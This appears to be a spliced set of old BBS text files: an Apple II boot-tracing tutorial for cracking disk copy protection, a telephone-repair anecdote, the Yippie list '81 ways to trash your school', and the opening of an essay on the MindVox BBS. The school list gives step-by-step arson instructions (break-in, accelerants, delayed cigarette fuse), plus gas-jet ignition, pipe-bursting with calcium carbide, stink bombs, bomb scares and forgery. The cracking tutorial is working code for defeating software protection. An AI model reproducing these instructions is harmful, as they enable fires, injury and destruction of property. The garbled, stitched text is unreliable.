C6E6  91 26     STA     26 ,Y C6E8  C8     INY C6E9  D0 EE     BNE    C6D9 C6EB  E6 27     INC    27 C6ED  E6 3D     INC    3D C6EF  A5 3D     LDA    3D C6F1  CD 00 08    CMP    0800 C6F4  A6 2B     LDX    2B C6F6  90 DB     BCC    C6D3 C6F8  4C 01 08    JMP    0801 C6FB  00     BRK C6FC  00     BRK C6FD  00     BRK     NOTICE THE INSTRUCTION 'JMP  0801' AT C6F8.  THIS IS THE  LINK  TO STAGE 1 OF THE BOOT.  IF WE COULD CHANGE IT TO 'JMP FF59',  EVERY  DISK WE BOOTED WOULD LOAD IN THE FIRST SECTOR, BEEP INTO THE MONITOR, AND OBLIGINGLY WAIT WHILE WE SNOOP THROUGH PAGE 8 TO OUR HEART'S CONTENT.  SINCE THE PROGRAM IS IN ROM, WE CAN'T ALTER IT, BUT WE CAN COPY IT DOWN TO A COMPATIBLE LOCATION AND ALTER IT SO THAT THE PROGRAM HALTS INSTEAD OF CONTINUING WITH THE BOOT PROCESS.  BECAUSE THE BOOT CODE HAS TO EXECUTE FROM AN  SLOT, IT CONTAINS A  WHERE ARE WE  ROUTINE AT C621 C62E TO FIND OUT WHAT ITS CURRENT LOCATION IS.  HAPPILY FOR US, THIS KIND OF RELOCATABLE CODE WILL RUN MANY PLACES BESIDES THE C100 C7FF PERIPHERAL ROM SPACE  SEE THE REFERENCE MANUAL P.  81 FOR A DESCRIPTION OF THE  WHERE ARE WE  ROUTINE .  MR. XEROX'S FAMOUS MONITOR INSTRUCTIONS WHICH RELOCATE THE BOOT ROM CODE AND INSERT THE FIRST BREAKPOINT ARE     9600 C600.C6FFM  96F8 4C 59 FF     NOTE PAGE 96 IS NOT REQUIRED, BUT THE PAGE YOU USE MUST END IN 6 SO THAT SLOT 6 IS DECODED AS THE CONTROLLER CARD LOACTION . THE LAST FEW LINES OF THE  RELOCATED  BOOT ROM CODE NOW READ   96F4  A6 2B     LDX  2B 96F6  90 DB     BCC  96D3 96F8  4C 59 FF    JMP  FF59  SO THAT TYPING    9600G     WILL INITIATE A BOOT SEQUENCE FROM OUR CODE AT 9600 WHICH ENDS AT THE  BREAK POINT  AT  96F8, RATHER THAN CONTINUING THE BOOT.  IF YOU TRY THIS, YOU'LL FIND THAT THE DISK IS STILL SPINNING, AND YOU CAN TURN IT OFF BY INCLUDING THE INSTRUCTION '2C E8 C0'  BIT C0E8  AT 96F8 BEFORE THE JMP FF59, OR YOU CAN JUST TYPE 'C0E8' FROM THE MONITOR.  AFTER PAGE 8 HAS BEEN LOADED WITH THE STAGE 1 BOOT CODE, THE FUN BEGINS  UNTIL YOU GET GOOD AT THIS, IT'S A GOOD IDEA TO SAVE EACH PIECE OF BOOT CODE AS A BFILE ON A SPARE DISK BEFORE PROCEEDING.  IT'S USUALLY EASIER THAN RUNNING THROUGH THE ENTIRE SEQUENCE EACH TIME A STEP DOESN'T WORK AS YOU EXPECT, AND IT WILL MAKE IT EASIER TO PRINT OUT A DISASSEMBLY OF THE CODE TO FIGURE OUT WHAT IT DOES.     AT THIS POINT, PAGE 8 MUST CONTAIN STAGE 1 OF THE BOOT WITH LOCATION  801 AS THE STARTING POINT.  IF THE FIRST STAGE IS KOSHER, LOCATION  84A CONTAINS '6C FD 08', WHICH IS AN INDIRECT JUMP THROUGH THE LOCATION IN 8FD   8FE.  THIS IS THE EXIT POINT OF THE STAGE ONE BOOT, AND NORMALLY JUMPS TO B700 TO BEGIN READING IN THE CODE FOR STAGE 2  THE B6 AT 8FE BECOMES B7 DURING THE 10 SECTOR LOAD .  TO CONTINUE OUR MISSION, WE MUST LOCATE THE EXIT POINT OF THIS STAGE AND INSERT A BREAKPOINT.    0801  A5 27     LDA    27 0803  C9 09     CMP     09 0805  D0 18     BNE    081F 0807  A5 2B     LDA    2B 0809  4A     LSR 080A  4A     LSR 080B  4A     LSR 080C  4A     LSR 080D  09 C0     ORA     C0 080F  85 3F     STA    3F 0811  A9 5C     LDA     5C 0813  85 3E     STA    3E 0815  18     CLC 0816  AD FE 08    LDA    08FE 0819  6D FF 08    ADC    08FF 081C  8D FE 08    STA    08FE 081F  AE FF 08    LDX    08FF 0822  30 15     BMI    0839 0824  BD 4D 08    LDA    084D,X 0827  85 3D     STA    3D 0829  CE FF 08    DGC    08FF 082C  AD FE 08    LDA    08FE 082F  85 27     STA    27 0831  CE FE 08    DEC    08FE 0834  A6 2B     LDX    2B 0836  6C 3E 00    JMP     003E  0839  EE FE 08    INC    08FE 083C  EE FE 08    INC    08FE 083F  20 89 FE    JSR    FE89 0842  20 93 FE    JSR    FE93 0845  20 2F FB    JSR    FB2F 0848  A6 2B     LDX    2B 084A  6C FD 08    JMP     08FD  084D  00     BRK 084E  0D 0B 09    ORA    090B 0851  07         0852  05 03     ORA    03 0854  01 0E     ORA     0E,X  0856  0C         0857  0A     ASL 0858  08     PHP 0859  06 04     ASL    04 085B  02         085C  0F         085D  00     BRK   !   ! 08FD  00     BRK 08FE  B6 09     LDX    09,Y    NONSTANDARD FORMATS CAN HAVE ANY NUMBER OF EXIT INSTRUCTIONS, AND THIS IS WHERE YOUR KNOWLEDGE OF ASSEMBLY LANGUAGE AND EXPERIENCE AT READING CODE WILL START TO PAY OFF.  UNLESS THE FIRST STAGE IS RELATIVELY STANDARD, IT'S NECESSARY TO SPEND TIME EXAMINING AND TEARING APART THE CODE UNTIL YOU UNDERSTAND WHAT'S GOING ON.  LOOK FIRST FOR A JUMP OR INDIRECT JUMP TO SOMEPLACE OUTSIDE OF PAGE 8, AND CHANGE THAT TO JMP FF59.  IF NONE APPEARS, LOOK FOR A  JUMP THROUGH THE STACK  TRICK AS DESCRIBED IN THE ARCADG MACHINE FILE   FOR EXAMPLE, TO GO TO  BB00 THERE WILL BE, SOMEWHERE IN THE CODE, TWO  PHA'S  AND AN  RTS .  THE FIRST PUSH ONTO THE STACK WOULD BE  BA  THE SECOND  FF.  WHEN THE RTS IS EXECUTED, THE TWO BYTES ARE PULLED OFF THE STACK, INCREMENTED BY ONE TO BB00, AND JUMPED TO. IN ADDITION, MORE THAN ONE PAGE CAN BE LOADED UNDER STAGE 0, AND ACCESSED BY A RELATIVE BRANCH INSTRUCTIoN, SO YOU'LL HAVE TO EXAMINE  ALL  THE CODE LOADED IN  IT'S GOOD PRACTICE TO CLEAR OUT ALL OF MEMORY BEFORE STARTING  THIS WILL WORK IF DOS IS NOT ACTIVE   800 0 N 801 800.BFFFM .    WHEN YOU FIND THE EXIT POINT, MAKE IT A BREAKPOINT WITH '4C 59 FF' TO PREVENT THE CONTINUATION OF THE BOOT.  BEFORE PROCEEDING, TAKE A GOOD LOOK AT ALL THE CODE TO BE SURE YOU UNDERSTAND WHERE THE NEXT STAGE LOADS, AND ANY UNUSUAL CONDITIONS OR INSTRUCTIONS.     THE ALTERED PORTION OF CODE IS NOW    0839  EE FE 08    INC    08FE 083C  EE FE 08    INC    08FE 083F  20 89 FG    JSR    FE89 0842  20 93 FE    JSR    FE93 0845  20 2F FB    JSR    FB2F 0848  A6 2B     LDX    2B 084A  4C 59 FF    JMP    FF59 084D  00     BRK    THE THEORY NOW IS TO ALLOW THE BOOT TO PROCEED THROUGH ONE MORE STAGE, HALTING AFTER RWTS HAS BEEN READ IN, AND GIVING US A CHANCE TO EXAMINE THAT PORTION OF THE PROGRAM FOR ALTERATIONS.  IF WE JUST REBOOTED WITH '9600G', THE ORIGINAL CODE WOULD OVERWRITE OUR ALTERED PAGE 8, SO WE HAVE TO ARRANGE IT SO THAT THE FIRST STAGE BOOT CODE IS SENT OFF INTO OBLIVION.  REFERRING BACK TO THE BOOT CODE, LOCATION 9658  ORIGINALLY C658  CONTAINS THE PAGE NUMBER WHERE T0, S0 LOADS IN, NORMALLY 08. CHANGING IT TO  20 WILL CAUSE T0, S0 TO LOAD INTO  2000 INSTEAD OF  0800, AND THE BOOT WILL CONTINUE THROUGH OUR ALTERED PAGE 8.  NOTE THAT WE HAVE TO REMOVE THE FIRST BREAK POINT AT 96F8 AND RESTORE THE ORIGINAL JMP  0801       9658 20     96F8 4C 01 08    NOW, WHEN WE TYPE '9600G', THE BOOT CODE WILL LOAD T0, S0 INTO  2000 20FF, WHERE IT WON'T BOTHER US AT ALL, THEN JUMP TO 801 TO EXECUTE OUR CODE.  AFTER RWTS HAS BEEN LOADED IN, INSTEAD OF JUMPING TO  B700 TO CONTINUE LOADING DOS, THE PROGRAM HITS THE  SECOND  BREAK POINT AT 84A AND HALTS.    THE FINAL PHASE OF THIS PROCESS IS TO LOCATE THE EXIT POINT FROM THIS AREA OF CODE, INSERT ANOTHER BREAKPOINT, AND EXAMINE ALL THE CODE LOADED IN BY STAGE 2. AGAIN, WE HAVE TO MAKE SURE THAT THE BOOT PROCESS DOESN'T OVERWRITE THE CHANGES, WHICH MEANS WE HAVE TO UNDERSTAND HOW THE DESTINATION ADDRESSES ARE SET UP IN STAGE 1.  EVEN IN NORMAL DOS IT'S NOT OBVIOUS, BUT ENOUGH HEAD SCRATCHING OR READING OF BENEATH APPLE DOS WILL REVEAL DHAT THE BYTE IN LOCATION 8FE IS ONE HIGHER THAN THE FIRST PAGE LOADED INTO, AND THE BYTE AT 8FF IS ONE LESS THAN THE NUMBER OF SECTORS TO BE LOADED.  AS BEFORE, WE REMOVE THE PREVIOUS BREAKPOINT, ALTER THE DESTINATION OF THE REAL CODE LOADED IN UNDER THIS STAGE, AND SET THE NEW BREAKPOINT   B700  8E E9 B7    STX    B7E9 B703  8E F7 B7    STX    B7F7 B706  A9 01     LDA     01 B708  8D F8 B7    STA    B7F8 B70B  8D EA B7    STA    B7EA B70E  AD E0 B7    LDA    B7E0 B711  8D E1 B7    STA    B7E1 B714  A9 02     LDA     02 B716  8D EC B7    STA    B7EC B719  A9 04     LDA     04 B71B  8D ED B7    STA    B7ED B71E  AC E7 B7    LDY    B7E7     !     !

THE MODIFIED STAGE 0 CODE AT 9600 96FF WILL LOAD T0, S0 INTO PAGE 20  SINCE WE DON'T WANT IT , THEN JUMP TO THE START OF OUR MODIFIED PAGE 8 AT 801.    2.

AFTER THAT, THE CODE FROM 80C 847 IS MIRRORED TO LOAD IN THE NEXT STAGE.  THE THREE LINES AT 10B6 10BF INDICATE THAT THE LOAD CONTINUES UNTIL PAGES BD, BE, AND BF HAVE BEEN LOADED, THEN QUITS AT PAGE  C0.  YOU WOULD NORMALLY EXPECT TO FIND A  JMP BD00  AS THE EXIT POINT FROM THIS STAGE OF THE BOOT  INSTEAD THERE IS A  JMP BA00  AT 10E5.  THE REASON IS THAT LINES 10C6  10DA CALL THE NEWLY LOADED LOADER ROUTINE AT BD00 THROUGH THE VECTOR AT 3D0. BY LOOKING AT THE SETUP FOR THAT LOAD, WE CAN LEARN A LITTLE ABOUT THE LOADER.  THE IMPORTANT PARTS OF ANY LOADER ROUTINE ARE THE DESTINATION PAGE, THE LENGTH OF THE LOAD, AND THE TRACK AND SECTOR TO BEGIN LOADING FROM. IN THIS CASE, THE FIRST AND LAST DESTINATION PAGE ARE LOADED INTO LOCATIONS 0 AND 1, AND THE TRACK AND SECTOR IN 4 AND 5.  AFTER THAT, A CALL TO THE 3D0 VECTOR JUMPS MERRILY UP TO BD00, WHICH IS THE  RWTS  ROUTINE FOR THIS PROGRAM.

BC00 IS A TEST TO SEE IF IT'S THE FIRST TIME THROUGH  LOCATION 800 IS 01 THE FIRST TIME, SO WE TRANSFER THE 5 VALUES FOUND AT BCBE BCC3 INTO LOCATIONS 0 5, THEN CALL THE LOADER ROUTINE, AND PAGES 8 14 ARE LOADED FROM TRACK 3, SECTOR 0.  AT BC1C BC2B, WE SET THE RESET VECTOR TO RETURN TO BC00  AND RESTART THE GAME  WHENEVER RESET IS PRESSED  THE REFERENCE MANUAL TELLS YOU HOW ON P.  37  IT'S P.  82 IN THE IIE MANUAL, IF YOU GOT RIPPED OFF FOR THAT ONE .  NEXT, PAGES A8 BB ARE LOADED FROM T1, S0, AND THE GAME BEGINS IN EARNEST.    ORDINARILY, THIS IS ABOUT AS FAR AS BOOT TRACING CAN TAKE YOU INTO THE ORGANIZATION OF A DISK.  JUST FOR THE EXERCISE, HOWEVER, LET'S PRETEND WE REALLY WANT TO FIND OUT WHAT GETS LOADED INTO PAGES A8 BB BEFORE THE GAME STARTS.  THE BREAKPOINT GOES IN...       10E5 4C 00 BA      1099 20      10BD 23  UNLESS YOU KNOW        IT'S SAFE, KEEP        THE   OF PAGES THE        SAME       BC47 4C 59 FF  SEE WHAT THAT CODE LOOKS LIKE BEFORE IT HAS A CHANCE TO UNSCRUNCH A PICTURE OR WHATEVER ELSE IT IS GOING TO DO.  ALSO, NOTICE THAT THE CODE AT BC54 AND AT THE ALTERNATIVE DESTINATION OF BCC4 BOTH LOAD OVER PAGES A8 BB.  IF NECESSARY, WE COULD CONTINUE WITH THIS PROCESS, PUTTING A BREAKPOINT AFTER EACH LOAD, UNTIL WE HAVE EXAMINED, SAVED, OR ALTERED EVERY ACCESSIBLE PART OF THE PROGRAM.    SO MUCH FOR THE  EASY  PART  NOW THE HARD WORK BEGINS.  WE HAVE LEARNED ABOUT ALL WE NEED TO KNOW ABOUT THE LOADER, BUT NOW WE HAVE TO FIND A WAY TO PUT ALL OF THIS INTO A FORMAT WHICH UNLESS WE CAN USE DOS ON THE LANGUAGE CARD, CONSIDERING THAT ALL OF THESE FILES LOAD RIGHT OVER THE MIDDLE OF DOS , OR CONVERT THE 4 4 NIBBLIZED SECTORS INTO STANDARD DOS 3.3 SECTORS  ALSO NOT TOO EASY, CONSIDERING THAT WE ONLY HAVE 3 PAGES FOR THE  DOS  .    IN CONCLUSION, YOU SHOULD BE AWARE THAT THE TECHNIQUES DESCRIBED HERE WORK EQUALLY WELL ON AN APPLE IIE  I HELD OUT FOR ALMOST 8 MONTHS, BUT NOW I CAN CONTEND THAT ALL THE TYPOS IN THIS EPISODE ARE THE RESULT OF HAVING FUNNY KEYS LIKE      ON AN APPLE KEYBOARD AFTER 5  YEARS OF TYPING ON GOOD OLD APPLE II S N 3603 . STAY TUNED FOR AN EXAMPLE WHICH IS A LITTLE MORE COMPLICATED THAN THIS ONE, AND REQUIRES CHANGES IN THE BOOT TRACE TECHNIQUE. ALSO IN THE WINGS IS  WHAT ELSE  HARDWARE MODIFICATIONS TO THE IIE  NO MOTHER BOARD SURGERY, I PROMISE  TO ALLOW KRAKROMS, HARD RESETS, AND KREATIVE KRACKING USE OF THE 64K 80 COLUMN BOARD.

It is common practice in England to signal a telephone subscriber by signaling with 90 volts across one side of the two wire circuit and ground  earth in England .  When the subscriber answers the phone, it switches to the two wire circuit for the conversation.  This method allows two parties on the same line to be signalled without disturbing each other.  This particular subscriber, an elderly lady with several pets called to say that her telephone failed to ring when her friends called and that on the few occations when it did manage to ring her dog always barked first.  Torn between curiosity to see this psychic dog and a realization that standard service techniques might not suffice in this case, Pat proceeded to the scene.  Climbing a nearby telephone pole and hooking in his test set, he dialed the subscriber's house.  The phone didn't ring.  He tried again.  The dog barked loudly, followed by a ringing telephone.  Climbing down from the pole, Pat found        a. Dog was tied to the telephone system's ground post via an iron chain and collar.       b. Dog was receiving 90 volts of signalling current.       c. After several jolts, the dog was urinating on ground and barking.       d. Wet ground now conducted and phone rang.  Which goes to prove that some grounding problems can be passed on......

'The Blacklisted News'  available for 13 bucks from the Youth International Party  Yippies .  OK here we go   81 ways to trash your school.                                                                                   Liberate your life   smash your school!  The public schools are slowly killing every kid in them stifling their creativity and individuality making them into non persons. If you are a victim of this one of the things you can do is fight back.    This chapter is not written for people who are not yet sure whether school is good or bad.  It is written for students that realize the way that compulsory education and grades destroy the natural curiosity so many children feel   who realize how the tracking system keeps the poor people and minorities in our society on the bottom while keeping te rich and powerful on the top   who realize the danger of teaching complete obedience to authority and who are fed up with the racism and sexism in schools.  It is written for students who have 'gone through channels' trying to correct these problems and who are tired of helplessly waiting while the schools destroy more and more minds each day.  It is written for young people who realize that because they are trapped in school they don't have a chance to learn what they need to know to create a free and good life.    Before trying any of the ideas in here you should think about the effect they will have in view of the situation in your particular area.  Not all of them will be effective at all times in all areas.  If you think of other ideas please send them to us so we can print them in future editions. YIP address is same as Overthrow mag. in general section  sysop II                                             WHAT YOU CAN DO                                    1.Get a syringe  minus needle  or similar device.  Mix both tubes of epoxy glue with a little rubbing alcohol.  You now have about half an hour to fill locks  door jams  etc. before glue hardens.  If you can't get the epoxy glue and syringe a tube of airplane cement can also be used although it is not as permanent.    2.An alternative use for the syringe is to pretend to shoot up while a teacher is watching.  If they speak to you tell them you have to do it because school is so horrible.    3.Call the school and leave the phone off the hook.  The way some  but not all  phone systems work this will tie up their phone for as long as yours is off the hook.    4.Protest U.S.  aid to reactionary regimes abroad by defoliating plants around the school or by digging a bomb crater on the front lawn.  When the ecology freaks complain ask them where they were when the U.S. was doing the same thing to indochina.    5.Draw or paste something 'obscene' on pull down wall maps or movie screens.    6.Get some of the punch cards that you school uses for taking attendance. Punch new holes in them either with a keypunch machine or a screwdriver.  Then switch the cards with others wherever they are stored. If you can figure out the code the cards are punched by this has even more possibilities.  You can often be just as effective without actually repunching the cards by redistributing them a few days after you collect them  particularly when they're used for attendence .    7.Start an information service to let new students opinions and warnings about the teachers and administrators before enrollment day.    8.Bad food   Have a good old fashioned food riot.    9.In gym classes or in hallways between classes have massive searches for 'lost' contact lenses telling people not to walk through the hall or 'you might step on it'.    10.If your school still has s dress code protest it having everyone do something disruptive that does not violate the code.  For example dye your hair green with food coloring.    11.Free all the animals in the biology classroom.    12.Write a 'consumer report' on the 'education' you've been consuming. Distribute it to parents at school functions.    13.Periodically have students go to the office to have some rumor confirmed or denied.    14.Perform citizen's arrests of administrators for destroying the minds of youth then telephone the police to come and take the criminals into custody.  This would be an excellent guerilla theatre action .    15.Rip off dishes and silverware from the cafeteria  towels from the gym  stencils and paper from the duplicating room  layout equipment from the art and drafting departments  tools from the wood shop and light bulbs from the sockets.  Give them to a needy movement group.    16.During lunch turn on and light all the gas jets in the science labs.    17.Demand to see your school records on file.   Everyone can see them.     18.You can make a very effective fuse by inserting a non filter cigarette in a book of matches so that it touches the head of some matches and will ignite them when it burns down that far.  Then loosly crumple paper around the matches and cigarettes so that they are hidden.  Toss it in a wastebasket or any other area with a lot of papers preferably in the office.  It takes 5 minutes to ignite   by then you can be on the other side of the building. Practice this at home before trying it.    19.Have giant coughing or sneezing epidemics in class or study hall.    20.Rub lipstick  glue  vaseline  or shit onto the doorknobs of the school's administrative offices.    21.Swallow some snake bite antidote then walk into the principal's office. The antidote  most types are harmless   make sure you get that kind  will make you vomit.  Do so all over his carpet  desk  clothing  etc.  then apologize profusely.    22.Pick up some dog training liquid at any pet store   it smells like concentrated piss.  And if you can't figure out what to do with that then you shouldn't be reading this.    23.Remove contents of teacher's mailboxes.  Print up everything that's confidential or interesting.    24.Leave notes and hints that 'Tuesday's the day'.    25.Impersonate parental voices and make irrate phone calls to the office.    26.Make a super stink bomb out of Hydrogen Sulfide and put somewhere in the ventilating system.  This has cleared school buildings for days.    27.If your school has a suspended ceiling that is a ceiling composed of rectangles or squares resting on a frame so that the rectangles can be pushed up  you can put a dead fish  or anything else  above them.  Or put it into empty lockers and glue them shut.    28.Put signs on your locker saying 'this locker will self destruct if opened for inspection'.    29.Give your school library a subscription to a good underground newspaper from your area and insist that they make it available to students.    30.Print up false notices frequently using the same format as the school uses and distribute them to the teachers' mailboxes.  Eventually they'll never know what to believe.    31.Make your own passes  forms  tickets  etc.   or lift them out of teachers' desks.    32.Need a signature  Collect things that have teachers' signatures on them. Paste them all down on a sheet of white paper and either xerox or print up a bunch of copies.  Forge when useful. When getting started you might put a piece of carbon paper under the signature with the carbon paper facing down on what you want signed.  Then trace over the name with a steady relaxed hand. Practice makes perfect.     33.Do some revolutionary wall painting.All you need is a can of spray paint  red   plus a little imagination and courage.  Then write your favorite slogans on walls  sidewalks  blackboards  etc. If you are a perfectionist you can make a stencil  but that limits the size of what you can do.  WEAR GLOVES or you will certainly get tell tale paint on your spraying finger.    34.Are certain teachers or adminis  trators misbehaving   Print up a rat sheet with their names and telephone numbers and distribute it.  Now students can call up at any time and reprimand them   3.00 A.M. for example.  Also you could order them pizzas  plumbers  think big!    35.Break into your school at night and burn it down. To get inside you can either hide in the building during the day and wait until the janitor leaves  know in advance what time that is   or come in later at night and either force your way through the door  find an open window  or break a window  see Monroe Mindfuck .  If you use the latter method do it a few hours or days in advance so you don't get caught if it attracts attention.  Be careful not to leave fingerprints   wear gloves all the time if possible.  Once inside make sure the walls will light well by placing loose paper or wood around them  or squirting lighter fluid  kerosene  or gasoline onto them.  If alot of burnable boxes are stacked in one area spread them around.  Start the fire from the inside of the building so it will take longer before it can be seen from the windows.  Make sure the fire has a way to travel from one burnable area to another.  Of course you should wear dark clothes and know exactly where you are going when you split.    36.Get hold of a film to be shown at a school assembly and splice in parts of another movie of your own choosing before the assembly.  A little imag  ination on your part will make for an unforgettable day.    37.Clog up the drains of sinks with clay then turn on the water after everyone leaves school.    38.Teachers often leave gradebooks  conduct sheets  and attendance records unguarded.  Take every chance to help yourself.    39.Put up posters all aroun the school.  To make them stick permanently use Pet evaporated milk for glue.    40.You could ice pick tires as a warning   but make sure you have a total enemy before you put sugar in their gastank.    41.Start wailing in the halls    42.If you can't find any skunks  let chickens loose in the school  or pigeons.    43.Creat the 'WEB OF THREAD' in your classroom.Have everybody in your class bring a spool of thread   with extras for people who forget.  Tie your thread onto something and pass the spools around till you run out   winding thread around everything.   It is best to pick on one of your more dullwitted teachers for this one . Expalin that you did it in the name of art.    44.Carry and pretend to sell oregano rolled in papers ans aspirin with the name filed off.    45.Put Calcium Carbide  available in some parts of the country as 'Gopher  Go'.also available in some hobby and joke shops  in a gelatin capsule and flush down a toilet or sink. Calcium Carbide reacts violently with water  quickly producing large amounts of gas and bursting pipes  etc.  as soon as the water disolves the capsule.    46.Ride a bicycle down a busy hall.    47.Save your book reports and essays.  Give them to other students to use next year or re use them yourself with different teachers.    48.Play with lighting and microphone controls during 'important' assem  blies.    49.Flush things down the toilets  preferably faculty johns  like baloons filled with air  baseballs  M80's  huge amounts of toilet paper  etc.  Then build an ark.    50.Start a campaign to have the letter Z appear everywhere as the mark of angry students.    51.You can short circuit the school's wiring by taking a regular plug with a short cord attached  connect the 2 wires with a switch between them.  Plug it in  turn the switch on  and you've blown a fuse.  Turn it off  pull it out  and try another.  You don't have to use the switch  but if you don't sometimes the current will arc and weld the plug to the socket.    52.Set up a fake school and hire away the lousy teachers   or put up notices inviting the entire school to a going away party for a teacher who isn't really leaving.    53.Read the school budgett.  Reprint and distribute a list of the stupid expenditures.    54.Take booze to lunch in a thermos and pass it around.    55.During some important test  SAT ACT etc.  on each subject have some student who is good at that subject stand up and read the correct answers for as long as possible.  When they're finished or silenced have someone else stand up and do the same thing.  The test results will be worthless and it will have to be given over at great cost to the school.    56.Take down the American flag in front of the school and put up one of your own.  The best way to do this is to lower the flag that's already up replace it with your flag and cut the rope about a foot below where the flag is attached. Then tie a slip knot around the other end of the rope that is hanging down to raise the flag.  At this point there is no way your flag can be lowered without someone climbing up the flagpole.    57.Put alarm clocks in various lockers set on 'loudest'.  Set the alarm clocks so they will go off about every 10 minutes then close and lock the lockers.    58.Have a group of people march around the school with a flag singing the Star Spangled Banner.  If the administration tries to punish you telephone your local radio stations and patriotic groups and complain that your school is being run by pinkos.    59.In a class where there is a rule against chewing gum have everyone blow a bubble at the same time one day.    60.Many schools have automatic sprinkler systems which go off automatically when sensors in the ceiling feel too much heat.  Find the sensors and hold up a match to them.    61.Persuade the graduating class to use their senior gift money for something useful or subversive.    62.Reprint SchoolStoppers Textbook in your underground paper or on a leaflet or buy bulk copies and pass them around.    63.Demand that all equipment being stored rather than being used be made available to students.    64.If your school won't have a teacher evaluation make up some forms and do it yourself.  Compile the result and publicize them to students  faculty  school board  and community.    65.Use your 'free choice' book reports  term papers  etc.  to read revolution  ary literature and further the poli  tical education of you and your class.    66.Have a student lie on the ground. When a teacher comes scream 'he jumped' and point to the roof or third floor window.  Mumble 'Fred dared him' or 'Maybe it was LSD.'    67.Make an address list of disliked adults in your school.  Answer sex ads for them   or order them a few gross items  C.O.D.  of course .    68.Toss handfuls of BB's on the floors of busy halls  assemblies  graduation ceremonies  weddings  funerals.    69.Steal cafeteria trays or plates  burn large holes in them  and turn them into the school washer saying 'I guess the food did it'.    70.Leave phony letters of resignation from teachers or administrators on the principal's desk.    71.Get a small group to always carry screwdrivers and slowly dismantle the school.    72.Lots of bomb scares tend to break up the boredom especially during exams or on beautiful days.    73.Photograph teachers and adminis  trators constantly   even without film.    74.If you've got the nerve piss in your pants while giving an oral report.    75.Splice into your school's intercom system  from a remote hidden spot . Now you have your own guerilla radio station.  Play on!    76.Drop large bottles of ether in science class.    77.Hang your teacher!  Hang a hangman's noose from a tree   make a dummy and hang the dummy from the noose. Pin notes on it like 'Weatherbee in '73.' To add realism put holes in the body then let dilute ketchup trickle down.    78.Newspaper stands in buildings are usually left unguarded. Take out papers and replace with rotten comics or papers.    79.Put a rotten apple or stale sand  wich on teacher's desk.    80.If your school intercom has phones that connect into the intercom switch  board  put a small magnet either where the cord comes out of the handset or in the part where you hear.  If the intercom just has a speaker  put the magnet near or on one of the elec  trical connections of the speaker. In either case it will short out the system.

Namely        those of,  where'd you guys go  ,  what's the deal with MindVox          and  what have you been doing for the last five years anyway                Overture does a decent job of tying up all of the above  and        then some, while providing a general overview about who we are at        Phantom Access and what we're in the process of doing with  Mind         Vox.   Sections  of  this article self plagiarize heavily from my        own writings in ENTROPY CALLING, which will be in a form suitable        for  publication sometime around the first quarter of 1993 at the        rate things are going right now.  My apologies for the perpetual         ly  blown  deadlines  regarding  this  work, but something always        manages to pop up that requires my full attention, in  this  case        MindVox itself.              I've done what I could to make everything understandable  by        even  those  who  have no prior knowledge of who we are or what's        going on, hopefully I have  at  least  partially  succeeded.   If        something  is  briefly  touched upon and you don't understand its        significance, then it  probably  means  something  to  a  smaller        cross section of people and you can safely ignore it.              While this is in many respects a personal account of my  own        journey  through  Cyberspace  and  what  it has meant to me and a        handful of my friends, on a larger scale the underlying theme and        basic  premise  of  how  the  electronic  universe  began and has        evolved is reflective of the experiences of countless people  who        have  been traversing the endless pathways of possibility with me        for most of their lives.          First Light                            A long time ago, in a thoughtspace far away, an event that  would        forevermore alter the shape of human interaction took place . . .         But we're not here to talk about that, instead we're  gonna  dis         cuss  computers  and how a couple of guys named Ward Christianson        and Randy Seuss wrote a program that would allow them to  be  set        up  as  a  kind of store and forward messaging system designed to        allow their circle of friends to interact with one another by us         ing  these  things  called  modems . . . and how this event would        prove to be the first truly accessible step  into  the  uncharted        territory of what was to become Cyberspace.         From this empowering turning point in  the  late  seventies,  the        ideas,  dreams and fantasies that would transmute and amplify hu         man potentials and evolutionary possibilities, broke  loose  from        the  shackles that primitive technology had imposed upon them and        began to spin the electronic universe into existence.         Still in the very early stages of its development, Cyberspace, or        the   modem  world  as it is sometimes called, has until very re         cently remained a largely untapped forum unique within the histo         ry  of our world.  It is a rapidly shifting microcosm that in the        early part of the 1990's seems poised to engulf the reality  from        which  it  was born, weaving together the threads of tens of mil         lions of diverse dreams, into one mercurial tapestry that  encom         passes the collective consciousness of humanity and frees it from        all constraints.         The non space of Cyberspace is a place where global changes  that        would  take years or even centuries outside of the online domain,        can occur in weeks or months.  It is a place  where  participants        from  all  over  the  world share a unique common ground based on        nothing less nor more, than a belief in the same vision of possi         bility.   It is a land where people who scoff at  The Elements of        Style  frequently write paragraphs, pages, and even novels,  full        of big words, huge concepts, and absolutely gargantuan amounts of        emoting    while actually saying nothing tangible.  In  a  little        over a decade, the online microcosm has managed to experience the        equivalent of hundreds of years of evolution.  Not to mention the        creation of hundreds of words which have found their way into the        online lexicon despite the fact that nobody is  quite  sure  what        they mean in the first place.         During this turbulent period of rapid change the half dozen  sys         tems  of 1978, had grown to 45 or 50 electronic villages by 1980.        These were the original outposts of Cyberspace, running on hacked        together  systems, hooked into industrial 8  drives, and network         ing at the blinding speed of  110  baud.   To  be  honest,  there        wasn't  really  a whole lot of high level philosophizing going on        regarding the brave new world that had dawned.  Actually, most of        the  conversation  tended  to focus on things along the lines of,         How do you hook an 8  drive onto an Apple       and   ANY  idiot        can  see  that  setting  the  7th bit high on the xdef reg is the        WRONG thing to do, OF COURSE it'll make the  program  crash,  are        you  stupid  or  something    It was a technological triumph, but        one that was for the most part, still lacking  many  of  the  key        participants that would shape the technology into designer reali         ties.         As the seventies drew to a close, the  sterility  and  bare bones        functionality that had predominated, began to make way for places        created by people who truly  wanted  something  unique  and  dif         ferent.   The mere existence of the technology was no longer that        exciting, and as a greater number of people gained access to  the        hardware  needed to jack in, the first electronic tribes gathered        and began erecting monuments to their own ingenuity.         By the time the eighties were upon us,  the  handful  of  systems        that  had  thrived  during the latter half of the previous decade        had multiplied rapidly, giving birth to new systems on an  almost        daily  basis, and by 1982 there were close to a thousand outposts        on the frontier.  Hardware prices were  falling,  1200bps  modems        were  actually within the reach of many people who wanted to pur         chase them, and the online domain was beginning to attract a wide        variety of participants from outside the technocratic elite.         A second pivotal point came during the summer of  1983  when  the        movie  WARGAMES  was  released.   Within several months the modem        world literally doubled in size.  An  entire  new  generation  of        people  were  about to take the plunge into electronic wonderland        and set off an explosive growth rate that has  not  slowed  since        then.  It was a major and irreversible nexus point that would be         gin the abrupt transition from taking Cyberspace from  the  realm        of underground sub culture to the forefront of mainstream media.         In retrospect the early eighties were the  golden age  of  Cyber         space.  There truly was a new frontier just over the horizon, and        we were standing at the edge.  This period in the history of  the        electronic universe was unruly and chaotic, the first settlers on        the frontier wouldn't arrive for another decade or  so,  and  the        only  people  here  were a small collection of explorers eager to        embark on the next adventure.         Of course one of the problems 